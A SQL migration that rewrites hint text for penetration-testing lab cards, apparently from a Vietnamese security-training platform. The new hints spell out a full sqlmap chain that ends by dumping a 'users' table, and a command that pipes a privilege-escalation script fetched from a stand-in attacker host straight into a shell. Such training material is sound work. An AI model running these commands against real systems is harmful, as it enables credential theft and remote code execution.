-- 0034: several hints only showed "which flag to add" (e.g. "thêm cờ --dbs")
-- without repeating the full command from the base of the chain, so typing
-- just that flag alone (as literally shown) was rejected -- confusing, per
-- user report. Rewrite these hints to show the complete, copy-paste-able
-- command each time. No pattern changes, only hint wording.

-- Lab 1 step 1: "Kết hợp cờ -l và -a" never even named the "ls" command.
UPDATE cards
SET payload = jsonb_set(payload, '{steps,0,hint}', '"ls -la  (kết hợp -l long và -a all)"'::jsonb, false)
WHERE kind = 'lab' AND front = 'Lab 1 — Làm quen lệnh Linux cơ bản';

-- Lab 4 steps 3-5 (sqlmap chain): each only showed the new flag(s).
UPDATE cards
SET payload = jsonb_set(
  jsonb_set(
    jsonb_set(
      payload,
      '{steps,2,hint}',
      '"sqlmap -u \"http://10.10.10.5/login.php?id=1\" --dbs"'::jsonb,
      false
    ),
    '{steps,3,hint}',
    '"sqlmap -u \"http://10.10.10.5/login.php?id=1\" -D app --tables"'::jsonb,
    false
  ),
  '{steps,4,hint}',
  '"sqlmap -u \"http://10.10.10.5/login.php?id=1\" -D app -T users --dump"'::jsonb,
  false
)
WHERE kind = 'lab' AND front = 'Lab 4 — SQL Injection (manual + sqlmap)';

-- Lab 7 step 4 (linpeas): give the exact copy-paste command too.
UPDATE cards
SET payload = jsonb_set(
  payload,
  '{steps,3,hint}',
  '"./linpeas.sh   (hoặc: curl http://<ip-attacker>:8000/linpeas.sh | sh)"'::jsonb,
  false
)
WHERE kind = 'lab' AND front = 'Lab 7 — Linux Privilege Escalation';
